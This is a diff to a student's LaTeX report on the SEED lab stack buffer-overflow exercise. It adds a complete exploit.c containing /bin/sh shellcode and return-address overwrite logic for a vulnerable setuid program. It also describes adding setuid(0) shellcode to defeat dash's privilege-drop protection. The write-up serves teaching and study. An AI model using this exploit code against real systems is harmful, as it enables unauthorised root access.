@@ -225,7 +225,7 @@ Now I have a vulnerable program that I can execute, and when executed the file w
 
 \section{Task 2}
 Now to exploit the vulnerability.\\
-To create the "badfile" I need to fill the file with the hex value of the exploit code, the address of the exploit code(positioned to overwrite the return address of the bof function), and a nop sled. This could possibly be done with a normal text editor, but can be done much easier with a simple c program. I am given the start to a C program which will generate the exploit file.
+To create the "badfile" I need to fill the file with the hex value of the exploit code, the address of the exploit code(positioned to overwrite the return address of the bof function), and a nop sled. This could possibly be done with a normal text editor, but can be done much easier with a simple c program. I am given the start to a C program which will generate the exploit file.
 \begin{lstlisting}[language=bash]
  /* exploit.c */
 /* A program that creates a file containing code for launching shell */
@@ -252,7 +252,7 @@ void main(int argc, char **argv)
     /* Initialize buffer with 0x90 (NOP instruction)*/
     memset(&buffer, 0x90, 517);
     /* You need to fill the buffer with appropriate contents here*/
-    /*... Put your code here …*/
+    /*... Put your code here ...*/
     /*Save the contents to the file "badfile"*/
     badfile = fopen("./badfile", "w");
     fwrite(buffer, 517, 1, badfile);
@@ -261,13 +261,76 @@ void main(int argc, char **argv)
 
 \end{lstlisting}\cite{seed-bof}\\
 
-To make the exploit work I will need to set the program to generate the appropriate number of NOP commands, then the exploit code, and then it must overwrite the location of the next instruction to execute the buffer from the stack. \\
+To make the exploit work I will need to set the program to: generate a number of NOP commands (to create a nop sled), place the exploit code, and then it must overwrite the location of the return address in the stack to execute the buffer as normal code. \\
+To find the location of the buffer in the stack program, I first tried to find the location using GDB. To find the location in GDB ran the stack program until I reached the bof function (the function with the vulnerability). Next I used the x command in GDB to output the location of the buffer in memory (x \&buffer ). When running GDB the location of my buffer would be at:
+0xbfffeb34\\
+I was unaware that GDB was adding their own assembly code into the program (which is needed for GDB to work properly) and caused the location to be slightly off of where the location is when running outside of gdb. To find the true value of the buffer location, I placed a printf function in the stack.c program which would output the location of the buffer during run time (this is shown in the stac.c program above).
+For my stack program, the location of the buffer in the stack during run time outside of GDB is :\\
+0xbfffeb38\\
+Now that I had the location of the buffer in memory, I could work on filling the buffer with enough data to overwright the return address, which I could then use to run my own exploit code.
+I started my program with the exploit code being at the start of the array, which led to some difficulties due to the return address being 36 bytes from the start of the buffer in the stack, and the exploit code being longer than that (by only a couple bytes). Since I wrote my code into the buffer before I entered my return address, I was overwriting my code with the return address. This allowed the buffer overflow to execute correctly, but would cause an error in the exploit code since it had been overwritten at the location of the return address. Because of this, when my exploit code would execute, there would be invalid commands where the return address was placed.\\
+After learning that my exploit was too long to be placed before the return address, I was able to adjust my code to move the exploit to behind the return address.\\
+My final exploit code looked as follows:\\
+\begin{lstlisting}[language=c]
+/* exploit.c */
+/* A program that creates a file containing code for launching shell */
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+char shellcode[] =
+    "\x31\xc0"   /* Line 1: xorl   %eax,%eax    */
+    "\x50"       /* Line 2: pushl  %eax         */
+    "\x68""//sh" /* Line 3: pushl  $0x68732f2f  */
+    "\x68""/bin" /* Line 4: pushl  $0x6e69622f  */
+    "\x89\xe3"   /* Line 5: movl   %esp,%ebx    */
+    "\x50"       /* Line 6: pushl  %eax         */
+    "\x53"       /* Line 7: pushl  %ebx         */
+    "\x89\xe1"   /* Line 8: movl   %esp,%ecx    */
+    "\x99"       /* Line 9: cdq                 */
+    "\xb0\x0b"   /* Line 10: movb  $0x0b,%al    */
+    "\xcd\x80"   /* Line 11: int   $0x80        */
+;
+void main(int argc, char **argv)
+{
+	int  arr_size    = 24;              // size of target array. (buffer that will be overflowed)
+	int  buff_size   = 517;             // size of badfile. (should match larger buffer size)
+	long buff_loc    = 0xbfffeb38;      // retrieved from outputting buffer location.
+	int  gcc_padding = arr_size + 12;   //36  - adding 8 to get to return address
+	int  nop_buff    = gcc_padding + 4; //40  - adding 4 nop's after return address, before source code
+	
+    char buffer[buff_size];
+    FILE *badfile;
+    /* Initialize buffer with 0x90 (NOP instruction)*/
+    memset(&buffer, 0x90, 517);
 
-The exploit code is approx. 25 bytes long, so it would be possible to have a small NOP sled of 8 or so commands. Next I will copy the exploit code into the buffer. For the final step, I will need to find the location of the smaller array in memory, this is so I know where to sent the return address too. \\
-For my program, the location is 
-0xbfffeb38
-I started my program with the executable code being at the start of the array, which led to some difficulties due to the return address being at location 28 in the stack, and the exploit code being longer than that. Since I wrote my code into the buffer before I entered my return address, I was overwriting my code with the return address. This allowed the buffer overflow to execute correctly, but would cause an error in the code since it had been overwritten.After moving the exploit code to below the return address, I was able to fit the whole exploit code without having to overwrite bytes.
- Now I just needed to match the return address with the address after the return address. I started finding the return address by running the stack program in gdb and then searching for the location of the buffer (x &buffer). After finding this location, and plugging it into my program, I was able to execute the shell in gdb. However, the program wouldn't execute the shell if I ran stack outside of gdb. This was due to gdb placing extra assembly code and causing the addresses to be off. But at least I knew my program was executing correctly. to find the actual address I edited the stack.c program to printf the memory location of the buffer. Then, after plugging this location into my exploit code I was able to successfully run the exploit.
+	/* Place return location after array */
+	int source_loc = buff_loc + nop_buff;
+	buffer[gcc_padding]   = (source_loc >> (8*0)) & 0xFF; // get first part of source code location
+	buffer[gcc_padding+1] = (source_loc >> (8*1)) & 0xFF; // get next more significate byte.
+	buffer[gcc_padding+2] = (source_loc >> (8*2)) & 0xFF; // ... and so on.
+	buffer[gcc_padding+3] = (source_loc >> (8*3)) & 0xFF;
+	
+	/* Copy source code into stack */
+	/* last byte is null, so it is removed */
+	strncpy( buffer+nop_buff, shellcode, sizeof(shellcode)-1);
+	
+    /*Save the contents to the file "badfile"*/
+    badfile = fopen("./badfile", "w");
+    fwrite(buffer, 517, 1, badfile);
+    fclose(badfile);
+}
+\end{lstlisting} \cite{seed-bof}\\
+
+\section{Task 3}
+Defeating Dash's countermeasure
+Dask compares the gid (effective user id) and uid (real user id) of the program 
+To defeat this coutermeasure, I can execute a different shell on the system. In this case, zsh. 
+To start we will symlink sh back to dash. 
+Now we will compile the dash program and set it to execute as root.
+Next we will run a program that will call a dash shell. This program will be ran twice, once without setting the uid to 0 and once with. When executing the program without running the setuid(0) line, it executes fine, and the user is your current user (seed). when executing the program with the setuid(0) line it still runs fine, but it sets your uid from 0 (root) back to your real uid (seed). So in short, it prevents switching users by reset your gid back to your uid.
+
+I will update the exploit code to use a new set of assembly code which adds 4 instructions (set ebx to 0 in Line 2, set eax to 0xd5 in Line 1 \& 3 (this will be setuid's system call), and the asm code to execute setuid on Line 4). With this code 
+When running the ./stack program with the new badfile created by adding the changes into the assembly code, I was still given a root shell. So the setuid(0) written into assembly code, and this time it was still effective at giving me root access. 
  
 \newpage
 \bibliographystyle{ACM}
